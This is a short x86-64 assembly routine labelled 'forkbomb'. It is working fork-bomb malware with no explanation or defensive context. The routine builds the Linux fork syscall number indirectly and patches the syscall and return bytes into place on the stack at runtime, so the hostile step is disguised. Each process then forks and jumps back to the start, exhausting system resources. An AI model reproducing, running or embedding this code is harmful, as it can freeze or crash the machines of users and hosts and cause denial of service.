forkbomb:
	nop
	lea rcx, [rel forkbomb]

	push rcx
	shl rax, 64
	mov al, 0x38
	inc al

	push 0xc359040e
	add word [rsp], 0x0101
	push rsp
	ret
	
